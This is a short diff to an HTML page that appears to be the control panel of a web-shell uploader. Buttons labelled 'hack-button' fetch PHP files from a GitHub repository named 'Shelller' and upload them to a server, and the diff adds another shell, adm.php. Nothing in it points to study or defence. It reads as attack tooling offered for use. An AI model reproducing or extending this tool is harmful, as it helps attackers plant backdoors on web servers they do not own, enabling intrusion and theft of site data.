@@ -129,6 +129,7 @@
     <button class="hack-button" onclick="uploadFile('https://github.com/securiywep/Shelller/raw/main/adminer.php')">Adminer Yükle</button>
     <button class="hack-button" onclick="uploadFile('https://github.com/securiywep/Shelller/raw/main/10.php')">oni Yükle</button>
     <button class="hack-button" onclick="uploadFile('https://github.com/securiywep/Shelller/raw/main/Maruji.php')">Maruji Yükle</button>
+    <button class="hack-button" onclick="uploadFile('https://github.com/securiywep/Shelller/raw/main/adm.php')">adm Yükle</button>
 </div>
 <br>
 <img src="https://i.hizliresim.com/920h03s.png" style="width: 100%;">
